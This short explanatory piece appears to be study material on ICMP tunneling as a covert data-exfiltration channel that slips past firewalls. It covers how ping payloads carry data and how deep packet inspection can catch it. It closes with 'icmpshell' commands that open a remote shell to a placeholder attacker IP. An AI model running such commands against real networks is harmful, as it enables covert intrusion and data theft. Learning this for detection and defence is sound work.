ICMP Tunneling for Covert Data Transfer

Encapsulating data within ICMP echo requests and replies to bypass firewalls.

How it Works

Data is encoded into the payload of ICMP echo request (ping) packets. The attacker's server listens for these packets, extracts the data, and can send responses similarly.

Stealth vs. Detection

Often allowed outbound, making it stealthy. However, unusual packet sizes or high volumes can be detected by deep packet inspection (DPI).

Key Takeaway

ICMP tunneling provides a covert exfiltration path, but its effectiveness depends on network monitoring sophistication.

ICMP Tunneling Example: `icmpshell`
# Attacker (server)
icmpshell -l
# Target (client)
# First, transfer the icmpshell client binary to the target
# Then, execute it
./icmpshell YOUR_ATTACKER_IP
# This establishes a shell over ICMP.
# Data exfiltration would then happen within this shell.
